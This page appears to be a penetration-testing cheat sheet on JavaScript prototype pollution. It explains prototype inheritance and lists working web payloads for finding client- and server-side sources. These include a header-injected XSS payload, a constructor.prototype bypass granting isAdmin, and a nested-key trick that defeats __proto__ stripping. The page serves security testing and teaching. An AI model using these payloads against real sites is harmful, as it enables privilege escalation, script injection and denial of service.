---
title: "Prototype pollution"
weight: 20
---

# Prototype pollution

{{< details summary="Introduction" >}}

```javascript
var my_object = {a:1, b:2}
```

Access the value of "a"

```javascript
console.log(my_object.a)     // Output: 1 
// functionally equivalent to... 
console.log(my_object["a"])  // Output: 1
```

Add a property

<pre class="language-javascript"><code class="lang-javascript"><strong>my_object["c"] = 3
</strong>// or... 
my_object.c = 3
</code></pre>

Every object has a `__proto__` (or prototype) property too which points to that object’s ‘prototype’, allowing it to inherit properties and methods.



If we try to access a property that doesn’t exist on `my_object`, JavaScript will next look to see if it is part of the next Object’s **proto** property

```javascript
empty_object = {} 
Object.prototype.x = 'test' 
console.log(empty_object.x) // test
```



```javascript
// Empty object. 
blank_object = {} 
// Object with a few properties
my_object = {a:1, b:2} 
// Define the 'z' property on the '__proto__' object of 'my_object': 
my_object["__proto__"]["z"] = "test" 

console.log(my_object.z)     // Output: test
console.log(blank_object.z)  // Output: test
console.log(Object.z)        // Output: test

// Note: here we add a 'z' property on the __proto__ object of 'my_object',
// that in this case is "Object".
```



```javascript
s = "test"
s.__proto__                         // String { .... }

// Define the 'z' property on the '__proto__' object of 's': 
s["__proto__"]["z"] = "bar"
console.log(s.z)                    // Output: bar

// Create another string ...
x = "test"
console.log(x.z)                    // Output: bar

// Create an object ...
obj = {}
console.log(obj.z)                    // Output: undefined

// Here we add a 'z' property on the __proto__ object of 's',
// that in this case is "String". So now all object all objects 
// that inherit "String" object have this property.
```

{{< /details >}}

More info: [https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/](https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/)

---

## Prototype pollution sources

The three most common JavaScript patterns that can lead to prototype pollution are merging, cloning, and value setting operations. Anytime an object is dynamically built from user input, there's a risk of prototype pollution.

---

## Client-side prototype pollution (manual)

### Finding sources

**In the URL**

1. Using a common XSS source, such as the URL parameters or hash, set a \_\_proto\_\_ payload, like this:

    ```md
    https://example.com/?__proto__[polluted]=Polluted 
    // or  
    https://example.com/#__proto__[polluted]=Polluted 
    // or  
    https://example.com/?__proto__.polluted=Polluted 
    ```

2. Check `Object.prototype` in your browser console to see if the property was successfully added:

    ```javascript
    Object.prototype.polluted // "Polluted" = successful pollution // undefined = failed attempt
    ```

3. Repeat with different sources

    An important point is that the `[]` and `.` notations are not valid JavaScript in this context; they are defined by the developer. So the pattern you should look for in any source is ‘nesting’

    Ridiculous example

    ```md
    https://example.com?firstParam=__prototype__&secondParam=polluted&thirdParam=Polluted 
    https://example.com?param->__proto__->polluted=Polluted 
    ```

***

**In JSON**

Test any kind of JSON. E.g. a JWT could be parsed client-side for example, without any kind of validation.

```json
{ 
  "alg": "HS256", 
  "typ": "JWT", 
  "kid": "123", 
  "__proto__": { 
      "polluted": "Polluted" 
  } 
} 
```

### Finding gadgets

Being able to affect the global `__proto__` property is not very useful unless you can use it to affect other parts of the code.

{{< hint style=tips >}}
**Tip**: Third-party libraries of prototype pollution gadgets [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)
{{< /hint >}}

---

## Browser APIs

**Fetch**

```javascript
fetch('https://website.com/change-email', {
    method: 'POST',
    body: 'user=test&email=test%40test.test'
})
```

Basically, here are defined `method` and `body` properties, but there are a number of other possible properties that we've left undefined. So, if you find a source, you can pollute `Object.prototype` with your own `headers` property.

```md
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

More info: [https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-fetch](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-fetch)

***

**Object.defineProperty()**

```javascript
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
```

Same thing. `defineProperty` accept other "descriptor" a.g. `value`.&#x20;

```javascript
/?__proto__[value]=foo
```

[https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-object-defineproperty](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-object-defineproperty)

---

## Client-side prototype pollution (with DOM Invader)

**Finding sources**

[https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution)

**Finding gadgets**

[https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets)

---

## Server-side prototype pollution

Javascript in the backend

{{< details summary="Introduction" >}}

An easy trap for developers is overlooking that a JavaScript for...in loop iterates over all of an object's enumerable properties, including inherited ones from the prototype chain.

```javascript
// Example with "object"
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```

```javascript
// Example with "array"
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
```

{{< /details >}}

{{< hint style=warning >}}
**Warning**: It's easy to unintentionally cause a denial-of-service (DoS), making testing in production risky. In addition, once a server-side prototype is polluted, the change persists for the entire lifetime of the Node process, with no way to reset it.
{{< /hint >}}

**Detection - (polluted property reflection)**

Attempt to pollute the global `Object.prototype` with an arbitrary property in a `POST` / `PUT` request

```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"ithomas",
    "firstName":"isaiah",
    "lastName":"thomas",
    "__proto__":{
        "foo":"bar"
    }
}
```

```http
HTTP/1.1 200 OK
...
{
    "username":"ithomas",
    "firstName":"isaiah",
    "lastName":"thomas",
    "foo":"bar"
}
```

**Detection - (without polluted property reflection \[Automatic])**

Server-Side Prototype Pollution Scanner (Burp extension)

Right click on the request -> Extensions -> Server-Side Prototype Pollution Scanner -> Server-Side Prototype Pollution

---

## Bypassing defenses

### Via the constructor

A common defense is to remove any properties with the key `__proto__` from user-controlled objects before merging them.

Use `myObject.constructor.prototype` that is equivalent to `myObject.__proto__`

```md
vulnerable-website.com/?foo.constructor.prototype=bar
```

```json
{
   "constructor":{
      "prototype":{
         "isAdmin":"true"
      }       
   }
}
```

### Bypassing flawed key sanitization

Read the js code to understand the defenses. E.g. bypass the strips of `__proto__`

```md
vulnerable-website.com/?__pro__proto__to__[foo]=bar
```
